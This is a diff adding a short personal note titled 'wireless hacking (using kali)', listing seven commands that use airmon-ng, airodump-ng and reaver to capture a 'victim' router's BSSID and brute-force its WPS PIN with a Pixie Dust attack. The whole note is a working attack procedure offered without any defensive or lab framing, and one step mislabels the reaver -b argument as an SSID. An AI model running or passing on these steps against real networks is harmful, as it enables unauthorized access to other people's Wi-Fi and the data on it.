@@ -1,0 +1,7 @@
+3. wireless hacking(using kali)
+ 1) airmon-ng check kill -> this instruction kills proccess 591(wpa_supplicant)
+ 2) airmon-ng check -> does not show anythings.
+ 3) airmon-ng start wlan0
+ 4) airodump-ng wlan0mon
+ 5) copy the bssid of the victim
+ 6) reaver -i wlan0mon -b (target ssid) -vv -K 1
